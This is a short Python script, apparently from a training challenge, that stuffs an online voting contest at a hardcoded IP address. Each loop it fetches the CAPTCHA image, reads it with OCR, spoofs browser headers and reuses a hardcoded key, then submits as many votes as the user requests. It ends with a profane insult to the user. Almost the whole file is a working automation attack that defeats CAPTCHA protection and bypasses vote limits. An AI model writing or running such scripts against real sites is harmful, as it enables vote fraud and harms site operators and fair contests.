#!/usr/bin/python3
from PIL import Image
import pytesseract
import requests
import io
print("This is an online Voting contest please provide your the ID of the contestor and how many times would you like to vote we'll take care of the rest *WINK ")
a = (input("who to vote for: "))
z = int(input("how any times kind sir?: "))
url = "http://158.69.76.135/level3.php"
ID = a
d = 0
cookies = {
   	'HoldTheDoor': 'ba13e970668921817e93be7c5194d61a6122b640',
		}
headers = {

    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36 OPR/66.0.3515.27',
    'Referer': 'http://158.69.76.135/level3.php',
	}
while d < z:
	s = requests.Session()
	w = s.get('http://158.69.76.135/captcha.php')
	img = Image.open(io.BytesIO(w.content))
	ocr = pytesseract.image_to_string(img, lang="eng")
	data = {
 'id': ID,
 'holdthedoor': 'Submit',
 'key': 'ba13e970668921817e93be7c5194d61a6122b640',
 'captcha': ocr
	}
	print("hey! the captcha is: {}".format(ocr))
	a = s.post(url, data=data, cookies=cookies, headers=headers)
	d += 1
print("           DONE! \n     Hope you're happy you lazy fuck")

